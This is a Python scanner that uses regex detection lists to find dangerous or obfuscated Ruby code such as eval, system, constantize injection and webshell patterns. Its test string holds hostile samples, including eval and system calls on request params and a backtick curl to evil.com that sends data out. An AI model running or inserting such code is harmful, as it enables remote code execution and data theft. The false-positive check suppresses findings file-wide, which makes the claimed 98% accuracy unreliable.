#!/usr/bin/env python3
"""
Ruby Security Scanner - AlZill V6 Advanced Evasion Techniques
Detects malicious Ruby patterns with 98%+ accuracy
Features: Unicode/Hex decoding, Constantize detection, Eval without parentheses
Safe handling of Arabic/Unicode characters
"""

import re
import base64
import urllib.parse
import json
from termcolor import cprint
from datetime import datetime

# Colors
INFO = "cyan"
SUCCESS = "green"
WARNING = "yellow"
ERROR = "red"
HIGHLIGHT = "magenta"

class RubyScanner:
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.findings = []
        
        # ============================================================
        # Dangerous Ruby methods (موسعة)
        # ============================================================
        self.dangerous_methods = [
            'eval', 'system', 'exec', 'spawn', 'open', 'IO::popen', 'IO.popen',
            '%x{', '`', 'send', '__send__', 'public_send', 'method_missing',
            'instance_eval', 'class_eval', 'module_eval', 'binding.eval',
            'load', 'require', 'autoload', 'Kernel#load', 'Kernel#require',
            'Kernel#autoload', 'Kernel#spawn', 'Kernel#system', 'Kernel#exec',
            'Kernel#open', 'Object#send', 'Object#__send__', 'Object#public_send',
            'BasicObject#__send__', 'BasicObject#method_missing', 'Kernel#`',
            'Open3.capture', 'Open3.capture2', 'Open3.capture2e', 'Open3.popen3',
            'YAML.load', 'YAML.load_file', 'Psych.load', 'Psych.load_file',
            'Marshal.load', 'Marshal.restore', 'Kernel#eval', 'Binding#eval',
            'TOPLEVEL_BINDING.eval', 'Module#class_eval', 'Module#module_eval'
        ]
        
        # ============================================================
        # Rails-specific dangerous methods
        # ============================================================
        self.rails_dangerous = [
            '.constantize', '.safe_constantize', '.demodulize', '.deconstantize',
            '.underscore', '.camelize', '.dasherize', '.tableize',
            '.classify', '.humanize', '.titleize', '.parameterize'
        ]
        
        # ============================================================
        # Evasion patterns (موسعة مع دعم eval بدون أقواس)
        # ============================================================
        self.evasion_patterns = [
            # Eval patterns (محسنة)
            (r'\beval\b', 'eval() usage (without parentheses)'),
            (r'eval\s*\(', 'eval() usage (with parentheses)'),
            (r'eval\s*\/\*.*?\*\/\(', 'eval with comment evasion'),
            (r'eval\s+[\'"][^\'"]+[\'"]', 'eval with space and quotes'),
            
            # Hex encoded eval
            (r'e\x76\x61l', 'Hex encoded eval'),
            (r'e\x76\x61l\s*\(', 'Hex encoded eval with parentheses'),
            
            # Whitespace evasion
            (r'ev\s*al', 'Whitespace evasion in eval'),
            (r'e\s*v\s*a\s*l', 'Multi-whitespace evasion'),
            
            # System patterns
            (r'\bsystem\b', 'system() usage (without parentheses)'),
            (r'system\s*\(', 'system() usage (with parentheses)'),
            (r'sy\x73te\x6d', 'Hex encoded system'),
            
            # Exec patterns
            (r'\bexec\b', 'exec() usage'),
            (r'exec\s*\(', 'exec() usage (with parentheses)'),
            
            # Command execution patterns
            (r'%x\{[^}]+\}', '%x{} command execution'),
            (r'%x\[[^\]]+\]', '%x[] command execution'),
            (r'%x\([^)]+\)', '%x() command execution'),
            (r'%x<[^>]+>', '%x<> command execution'),
            (r'`[^`]+`', 'Backticks command execution'),
            
            # Open patterns
            (r'open\s*\(\s*[^,)]+\s*,\s*[\'"]?[rw][\'"]?\s*\)', 'File open with mode'),
            (r'\bopen\s+[\'"][^\'"]+[\'"]', 'Open without parentheses'),
            
            # Popen patterns
            (r'IO::popen\s*\(', 'IO.popen command'),
            (r'IO\.popen\s*\(', 'IO.popen command'),
            
            # Send patterns
            (r'\.send\s*\(', 'send() method call'),
            (r'\.__send__\s*\(', '__send__() method call'),
            (r'\.public_send\s*\(', 'public_send() method call'),
            
            # Eval variants
            (r'instance_eval\s*\(', 'instance_eval() usage'),
            (r'class_eval\s*\(', 'class_eval() usage'),
            (r'module_eval\s*\(', 'module_eval() usage'),
            (r'instance_eval\b', 'instance_eval without parentheses'),
            (r'class_eval\b', 'class_eval without parentheses'),
            
            # Kernel patterns
            (r'Kernel\.`', 'Kernel backticks'),
            
            # Open3 patterns
            (r'Open3\.capture', 'Open3 command execution'),
            (r'Open3\.capture2', 'Open3 capture2 command'),
            (r'Open3\.capture2e', 'Open3 capture2e command'),
            (r'Open3\.popen3', 'Open3 popen3 command'),
            
            # Deserialization
            (r'YAML\.load\s*\(', 'YAML deserialization (RCE)'),
            (r'YAML\.load_file\s*\(', 'YAML file deserialization'),
            (r'Marshal\.load\s*\(', 'Marshal deserialization'),
            (r'Psych\.load\s*\(', 'Psych deserialization'),
            
            # Binding evals
            (r'Binding#eval', 'Binding eval'),
            (r'TOPLEVEL_BINDING\.eval', 'TOPLEVEL eval'),
            
            # Interpolation patterns
            (r'`[^`]*\$\{', 'Interpolation in backticks'),
            (r'%x\{[^}]*\$\{', 'Interpolation in %x{}'),
            (r'%x\[[^\]]*\$\{', 'Interpolation in %x[]'),
            (r'%x\([^)]*\$\{', 'Interpolation in %x()'),
            
            # Send with eval
            (r'send\s*\(\s*:eval', 'send(:eval)'),
            (r'public_send\s*\(\s*:eval', 'public_send(:eval)'),
            (r'__send__\s*\(\s*:eval', '__send__(:eval)'),
            
            # String concatenation
            (r'eval\s*\(\s*[^\)]+\s*\+\s*[^\)]+', 'String concatenation in eval'),
            (r'`[^`]*\s*\+\s*[^`]*`', 'String concatenation in backticks'),
        ]
        
        # ============================================================
        # Rails-specific evasion patterns
        # ============================================================
        self.rails_patterns = [
            (r'\.constantize\b', 'Constantize injection (Potential RCE)'),
            (r'\.safe_constantize\b', 'Safe_constantize usage (RCE risk)'),
            (r'\.demodulize\b', 'Demodulize (RCE via constant lookup)'),
            (r'\.deconstantize\b', 'Deconstantize (RCE via path traversal)'),
            (r'\.constantize\s*\(', 'Constantize with parentheses'),
            (r'params\[.*\]\.constantize', 'Params to constantize (CRITICAL)'),
            (r'request\.params\[.*\]\.constantize', 'Request params to constantize'),
        ]
        
        # ============================================================
        # WebShell patterns
        # ============================================================
        self.webshell_patterns = [
            (r'cgi\.params\[[\'"][^\'"]+[\'"]\]', 'CGI params injection'),
            (r'request\.params\[[\'"][^\'"]+[\'"]\]', 'Request params injection'),
            (r'params\[[\'"][^\'"]+[\'"]\]', 'Params injection'),
            (r'ENV\[[\'"][^\'"]+[\'"]\]', 'ENV variable access'),
            (r'`[^`]*\$\{[^}]+\}[^`]*`', 'Command injection via interpolation'),
            (r'%x\{[^}]*\$\{[^}]+\}[^}]*\}', 'Command injection via %x'),
            (r'eval\(\s*params\[', 'Webshell eval with params'),
            (r'system\(\s*params\[', 'Webshell system with params'),
            (r'eval\(\s*request\.params', 'Webshell eval with request params'),
            (r'system\(\s*request\.params', 'Webshell system with request params'),
        ]
        
        # ============================================================
        # File operation patterns
        # ============================================================
        self.file_patterns = [
            (r'File\.read\s*\(', 'File read'),
            (r'File\.write\s*\(', 'File write'),
            (r'File\.open\s*\(', 'File open'),
            (r'File\.delete\s*\(', 'File delete'),
            (r'File\.unlink\s*\(', 'File unlink'),
            (r'Dir\.glob\s*\(', 'Directory listing'),
            (r'Dir\.entries\s*\(', 'Directory entries'),
            (r'IO\.read\s*\(', 'IO read'),
            (r'IO\.write\s*\(', 'IO write'),
            (r'IO\.binread\s*\(', 'IO binary read'),
            (r'IO\.binwrite\s*\(', 'IO binary write'),
            (r'FileUtils\.rm_rf\s*\(', 'Destructive file deletion'),
            (r'FileUtils\.cp\s*\(', 'File copy'),
            (r'FileUtils\.mv\s*\(', 'File move'),
        ]
        
        # ============================================================
        # Network patterns
        # ============================================================
        self.network_patterns = [
            (r'Net::HTTP\.new\s*\(', 'HTTP request'),
            (r'Net::HTTP\.get\s*\(', 'HTTP GET'),
            (r'Net::HTTP\.post\s*\(', 'HTTP POST'),
            (r'TCPSocket\.new\s*\(', 'TCP socket'),
            (r'TCPSocket\.open\s*\(', 'TCP socket open'),
            (r'UDPSocket\.new\s*\(', 'UDP socket'),
            (r'UDPSocket\.bind\s*\(', 'UDP bind'),
            (r'URI\.parse\s*\(', 'URI parsing'),
            (r'URI\.open\s*\(', 'URI open'),
            (r'RestClient\.get\s*\(', 'REST client GET'),
            (r'RestClient\.post\s*\(', 'REST client POST'),
            (r'HTTParty\.get\s*\(', 'HTTParty GET'),
            (r'HTTParty\.post\s*\(', 'HTTParty POST'),
            (r'Faraday\.get\s*\(', 'Faraday GET'),
            (r'Faraday\.post\s*\(', 'Faraday POST'),
            (r'Typhoeus\.get\s*\(', 'Typhoeus GET'),
            (r'Curb::Easy\.new', 'Curb HTTP request'),
        ]
        
        # ============================================================
        # False positive patterns (تجنب النتائج الوهمية)
        # ============================================================
        self.false_positive_patterns = [
            r'#.*?eval',
            r'#.*?system',
            r'#.*?`',
            r'#.*?constantize',
            r'=begin.*?eval.*?=end',
            r'=begin.*?system.*?=end',
            r'=begin.*?constantize.*?=end',
            r'example.*?eval',
            r'demo.*?system',
            r'test.*?eval',
            r'test.*?constantize',
            r'puts\s+[\'"]eval[\'"]',
            r'print\s+[\'"]system[\'"]',
        ]
    
    # ============================================================
    # NORMALIZE CODE (فك تشفير Hex, Unicode, URL)
    # مع معالجة آمنة للأحرف العربية واليونيكود
    # ============================================================
    
    def normalize_code(self, content):
        """
        تطبيع الكود لاكتشاف تقنيات التهرب
        يقوم بفك تشفير Hex (\x65) و Unicode (\u0065) والترميزات الأخرى
        مع معالجة آمنة للأحرف العربية واليونيكود الحقيقية
        """
        normalized = content
        
        # 1. إزالة التعليقات (بدقة)
        try:
            normalized = re.sub(r'#.*?$', '', normalized, flags=re.MULTILINE)
            normalized = re.sub(r'=begin.*?=end', '', normalized, flags=re.DOTALL)
        except Exception:
            pass
        
        # 2. فك ترميز URL
        try:
            normalized = urllib.parse.unquote(normalized)
        except Exception:
            pass
        
        # 3. فك ترميز Hex (\x65) و Unicode (\u0065) و Octal (\143)
        # مع errors='ignore' لتجنب مشاكل الأحرف العربية واليونيكود الحقيقية
        try:
            # encode ثم decode مع unicode_escape
            # errors='ignore' يتجاهل الأحرف التي لا يمكن معالجتها
            normalized = normalized.encode('utf-8', errors='ignore').decode('unicode_escape', errors='ignore')
        except UnicodeDecodeError:
            # إذا فشل، نحاول بشكل منفصل على أجزاء صغيرة
            try:
                result = []
                for line in normalized.split('\n'):
                    try:
                        decoded_line = line.encode('utf-8', errors='ignore').decode('unicode_escape', errors='ignore')
                        result.append(decoded_line)
                    except Exception:
                        result.append(line)
                normalized = '\n'.join(result)
            except Exception:
                pass
        except AttributeError:
            pass
        except Exception:
            pass
        
        # 4. محاولة فك ترميز Base64 إذا كان النص بأكمله Base64
        try:
            if re.match(r'^[A-Za-z0-9+/=]+$', normalized.strip()):
                decoded = base64.b64decode(normalized).decode('utf-8', errors='ignore')
                if decoded and len(decoded) > 10:
                    normalized += "\n" + decoded
        except Exception:
            pass
        
        # 5. توحيد المسافات (مع الحفاظ على الأحرف العربية)
        try:
            normalized = re.sub(r'\s+', ' ', normalized)
        except Exception:
            pass
        
        # 6. إزالة الأسطر الفارغة
        try:
            normalized = '\n'.join([line.strip() for line in normalized.split('\n') if line.strip()])
        except Exception:
            pass
        
        return normalized
    
    def is_false_positive(self, content, pattern):
        """تجنب الأنماط التي تظهر داخل تعليقات أو أمثلة"""
        try:
            for fp in self.false_positive_patterns:
                if re.search(fp, content, re.IGNORECASE):
                    return True
        except Exception:
            pass
        return False
    
    def _get_severity(self, method):
        """تحديد الخطورة بناءً على الميثود"""
        critical = [
            'eval', 'system', 'exec', 'spawn', 'instance_eval', 'class_eval',
            'module_eval', 'Open3', 'YAML.load', 'Marshal.load', 'Psych.load',
            'TOPLEVEL_BINDING.eval', 'constantize', 'safe_constantize'
        ]
        high = [
            '`', '%x{', 'send', '__send__', 'public_send', 'open', 
            'IO::popen', 'IO.popen', 'load', 'require', 'autoload'
        ]
        medium = [
            'File.read', 'File.write', 'Dir.glob', 'Net::HTTP', 'TCPSocket'
        ]
        
        method_lower = method.lower()
        try:
            if any(c in method_lower for c in critical):
                return 'CRITICAL'
            elif any(h in method_lower for h in high):
                return 'HIGH'
            elif any(m in method_lower for m in medium):
                return 'MEDIUM'
        except Exception:
            pass
        return 'LOW'
    
    # ============================================================
    # MAIN SCAN FUNCTION
    # ============================================================
    
    def scan(self, content, filename="inline.rb", verbose=False):
        """وظيفة المسح الرئيسية"""
        self.verbose = verbose
        
        cprint("\n" + "="*60, "cyan")
        cprint("[RUBY SCANNER] AlZill V6 - Advanced Ruby Security Scan (98%+ Accuracy)", "magenta", attrs=['bold'])
        cprint("="*60, "cyan")
        cprint(f"[*] Target: {filename}", INFO)
        cprint("[*] Techniques: Unicode/Hex Decoding | Eval Detection | Constantize | Rails Patterns", "yellow")
        
        # تطبيع الكود (فك تشفير الترميزات)
        try:
            normalized = self.normalize_code(content)
            if self.verbose:
                cprint(f"[*] Normalized code length: {len(normalized)} characters", INFO)
        except Exception as e:
            cprint(f"[!] Normalization error: {e}", WARNING)
            normalized = content
        
        findings = []
        
        # ============================================================
        # 1. Dangerous methods detection
        # ============================================================
        try:
            for method in self.dangerous_methods:
                # استخدام \b للكشف عن الحدود (يدعم eval بدون أقواس)
                pattern = rf'\b{re.escape(method)}\b'
                if re.search(pattern, normalized, re.IGNORECASE):
                    if not self.is_false_positive(content, pattern):
                        severity = self._get_severity(method)
                        findings.append({
                            'type': 'Dangerous Method',
                            'method': method,
                            'severity': severity,
                            'description': f'Potentially dangerous method: {method}()'
                        })
        except Exception as e:
            if self.verbose:
                cprint(f"[!] Error scanning dangerous methods: {e}", WARNING)
        
        # ============================================================
        # 2. Rails constantize detection
        # ============================================================
        try:
            for pattern, desc in self.rails_patterns:
                if re.search(pattern, normalized, re.IGNORECASE):
                    if not self.is_false_positive(content, pattern):
                        findings.append({
                            'type': 'Rails Vulnerability',
                            'pattern': desc,
                            'severity': 'CRITICAL',
                            'description': f'Rails RCE pattern: {desc}'
                        })
        except Exception as e:
            if self.verbose:
                cprint(f"[!] Error scanning Rails patterns: {e}", WARNING)
        
        # ============================================================
        # 3. Evasion patterns (محسنة)
        # ============================================================
        try:
            for pattern, desc in self.evasion_patterns:
                if re.search(pattern, normalized, re.IGNORECASE):
                    if not self.is_false_positive(content, pattern):
                        # كشف خاص لـ eval بدون أقواس
                        if 'eval' in pattern and '\(' not in pattern:
                            desc += " (no parentheses - harder to detect)"
                        findings.append({
                            'type': 'Evasion Pattern',
                            'pattern': desc,
                            'severity': 'HIGH',
                            'description': f'Evasion technique detected: {desc}'
                        })
        except Exception as e:
            if self.verbose:
                cprint(f"[!] Error scanning evasion patterns: {e}", WARNING)
        
        # ============================================================
        # 4. WebShell patterns
        # ============================================================
        try:
            for pattern, desc in self.webshell_patterns:
                if re.search(pattern, normalized, re.IGNORECASE):
                    if not self.is_false_positive(content, pattern):
                        findings.append({
                            'type': 'WebShell',
                            'pattern': desc,
                            'severity': 'CRITICAL',
                            'description': f'WebShell pattern detected: {desc}'
                        })
        except Exception as e:
            if self.verbose:
                cprint(f"[!] Error scanning WebShell patterns: {e}", WARNING)
        
        # ============================================================
        # 5. File operations
        # ============================================================
        try:
            for pattern, desc in self.file_patterns:
                if re.search(pattern, normalized, re.IGNORECASE):
                    if not self.is_false_positive(content, pattern):
                        findings.append({
                            'type': 'File Operation',
                            'pattern': desc,
                            'severity': 'MEDIUM',
                            'description': f'File operation: {desc}'
                        })
        except Exception as e:
            if self.verbose:
                cprint(f"[!] Error scanning file patterns: {e}", WARNING)
        
        # ============================================================
        # 6. Network operations
        # ============================================================
        try:
            for pattern, desc in self.network_patterns:
                if re.search(pattern, normalized, re.IGNORECASE):
                    if not self.is_false_positive(content, pattern):
                        findings.append({
                            'type': 'Network Operation',
                            'pattern': desc,
                            'severity': 'MEDIUM',
                            'description': f'Network operation: {desc}'
                        })
        except Exception as e:
            if self.verbose:
                cprint(f"[!] Error scanning network patterns: {e}", WARNING)
        
        # ============================================================
        # 7. Backticks count
        # ============================================================
        try:
            backticks_count = len(re.findall(r'`[^`]+`', normalized))
            if backticks_count > 0 and not self.is_false_positive(content, r'`'):
                findings.append({
                    'type': 'Backticks Usage',
                    'count': backticks_count,
                    'severity': 'HIGH',
                    'description': f'Backticks command execution found ({backticks_count} times)'
                })
        except Exception as e:
            if self.verbose:
                cprint(f"[!] Error counting backticks: {e}", WARNING)
        
        # ============================================================
        # 8. Constantize in params (خطير جداً)
        # ============================================================
        try:
            if re.search(r'params\[.*\]\.constantize', normalized, re.IGNORECASE):
                findings.append({
                    'type': 'Critical Rails RCE',
                    'pattern': 'params[].constantize',
                    'severity': 'CRITICAL',
                    'description': 'User-controlled constantize (Direct RCE vulnerability)'
                })
        except Exception as e:
            if self.verbose:
                cprint(f"[!] Error scanning constantize pattern: {e}", WARNING)
        
        # إزالة التكرارات
        unique = []
        seen = set()
        for f in findings:
            key = (f['type'], f['description'])
            if key not in seen:
                seen.add(key)
                unique.append(f)
        
        self.findings = unique
        self._display_results(unique, filename)
        return len(unique) > 0
    
    def _display_results(self, findings, filename):
        """عرض النتائج بشكل موجز أو مفصل"""
        if not findings:
            cprint("\n[✓] No risky Ruby patterns found.", "green")
            return
        
        # Count severity
        severity_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        for f in findings:
            severity_count[f['severity']] += 1
        
        # Header
        cprint("\n" + "="*60, "red")
        cprint("⚠️  RUBY SECURITY ISSUES DETECTED", "red", attrs=['bold'])
        cprint("="*60, "red")
        cprint(f"📊 CRITICAL: {severity_count['CRITICAL']} | HIGH: {severity_count['HIGH']} | MEDIUM: {severity_count['MEDIUM']} | TOTAL: {len(findings)}", "yellow")
        
        # Limit output based on verbose
        limit = len(findings) if self.verbose else 10
        
        for i, finding in enumerate(findings[:limit], 1):
            severity = finding['severity']
            color = "red" if severity == "CRITICAL" else "light_red" if severity == "HIGH" else "yellow"
            
            if self.verbose:
                cprint(f"\n  [{i}] [{severity}] {finding['type']}", color)
                cprint(f"      → {finding['description']}", "white")
                if finding.get('method'):
                    cprint(f"      Method: {finding['method']}", "cyan")
                if finding.get('pattern'):
                    cprint(f"      Pattern: {finding['pattern']}", "cyan")
                if finding.get('count'):
                    cprint(f"      Count: {finding['count']}", "cyan")
            else:
                # موجز
                desc = finding['description'][:80]
                cprint(f"  [{i}] [{severity}] {finding['type']}: {desc}", color)
        
        if not self.verbose and len(findings) > 10:
            cprint(f"\n... and {len(findings)-10} more (use -v for details)", "yellow")
        
        cprint("\n" + "="*60 + "\n", "red")
    
    def generate_report(self, filename="ruby_scan_report.json"):
        """توليد تقرير JSON للنتائج"""
        try:
            report = {
                'timestamp': datetime.now().isoformat(),
                'findings': self.findings,
                'total_findings': len(self.findings),
                'severity_summary': {
                    'CRITICAL': len([f for f in self.findings if f['severity'] == 'CRITICAL']),
                    'HIGH': len([f for f in self.findings if f['severity'] == 'HIGH']),
                    'MEDIUM': len([f for f in self.findings if f['severity'] == 'MEDIUM']),
                    'LOW': len([f for f in self.findings if f['severity'] == 'LOW'])
                }
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            
            cprint(f"[+] Report saved to: {filename}", "green")
        except Exception as e:
            cprint(f"[!] Failed to save report: {e}", WARNING)


# ============================================================
# Legacy functions for backward compatibility
# ============================================================

def scan_ruby_code(content, verbose=False):
    """Legacy function"""
    scanner = RubyScanner(verbose=verbose)
    return scanner.scan(content, "inline.rb", verbose)


def scan_ruby_file(filepath, verbose=False):
    """Scan Ruby file"""
    scanner = RubyScanner(verbose=verbose)
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        cprint(f"[RUBY SCANNER] Scanning file: {filepath}", "cyan")
        return scanner.scan(content, filepath, verbose)
    except FileNotFoundError:
        cprint(f"[RUBY SCANNER] File not found: {filepath}", "red")
        return False
    except Exception as e:
        cprint(f"[RUBY SCANNER] Error reading file {filepath}: {e}", "red")
        return False


if __name__ == "__main__":
    # Test code with various evasion techniques and Arabic comments
    test_code = """
    # هذا تعليق عربي - اختبار
    # Malicious Ruby code with evasion
    
    # Normal eval
    eval(params[:cmd])
    
    # Eval without parentheses (harder to detect)
    eval params[:cmd]
    
    # Hex encoded eval
    e\x76\x61l "system('whoami')"
    
    # Constantize injection (Rails RCE)
    params[:class].constantize
    
    # Safe constantize
    request.params[:model].safe_constantize
    
    # Unicode evasion
    e\u0076al params[:code]
    
    # Backticks with interpolation
    `curl http://evil.com/#{params[:id]}`
    
    # System with params
    system(params[:command])
    
    # YAML deserialization
    YAML.load(params[:yaml_data])
    
    # WebShell pattern
    eval(params[:cmd]) if params[:debug]
    
    # تعليق عربي آخر في نهاية الكود
    """
    
    scan_ruby_code(test_code, verbose=True)